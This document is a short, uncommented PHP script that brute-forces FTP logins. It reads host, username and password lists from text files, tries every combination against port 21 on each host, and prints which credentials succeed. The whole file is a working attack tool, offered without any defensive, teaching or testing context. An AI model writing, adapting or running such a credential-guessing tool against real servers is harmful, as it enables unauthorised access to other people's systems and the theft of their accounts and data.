<?php
$port = 21;
$timeout = 3;

$list_ip = file_get_contents("ip.txt"); # IP LIST
$list_login = file_get_contents("login.txt"); # USER LIST
$list_pass = file_get_contents("pass.txt"); # PASS LIST

$hosts= explode("\n", $list_ip);
$users= explode("\n", $list_login);
$passw= explode("\n", $list_pass);

foreach($hosts as $host){
foreach($users as $user){
foreach($passw as $pass){
  $host= trim($host);
  $user= trim($user);
  $pass= trim($pass);

  $connect = ftp_connect($host, $port, $timeout);if(!$connect){break;}
  $login = ftp_login($connect, $user, $pass);
  if($login){
  echo "<font color='green'>".$host."@".$user.";".$pass."</font><br>";
  ftp_close($connect);
  } else {
       echo "<font color='red'>".$host."@".$user.";".$pass."</font><br>";
  ftp_close($connect);
  }
}
}
}
?>
